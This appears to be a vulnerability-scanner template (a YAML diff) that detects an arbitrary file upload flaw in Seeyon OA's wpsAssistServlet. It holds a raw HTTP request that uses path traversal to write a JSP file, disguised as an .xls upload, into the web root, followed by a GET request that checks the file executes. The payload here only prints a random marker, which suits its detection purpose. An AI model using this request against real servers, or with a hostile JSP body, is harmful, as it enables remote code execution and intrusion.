@@ -1,0 +1,48 @@
+id: seeyon-oa-wpsassistservlet-file-upload
+info:
+  name: Seeyon OA wpsAssistServlet Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-upload
+
+variables:
+  t1: "{{rand_text_alphanumeric(8)}}"
+  t2: "{{md5(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/{{t1}}.jsp&fileId=2 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylAoqLthw9exSsFFB
+
+        ------WebKitFormBoundarylAoqLthw9exSsFFB
+        Content-Disposition: form-data; name="upload"; filename="123.xls"
+        Content-Type: application/vnd.ms-excel
+
+        <% out.println("{{t2}}");%>
+        ------WebKitFormBoundarylAoqLthw9exSsFFB--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"success":true'
+          - '"code":200'
+
+  - method: GET
+    path:
+      - /{{t1}}.jsp
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
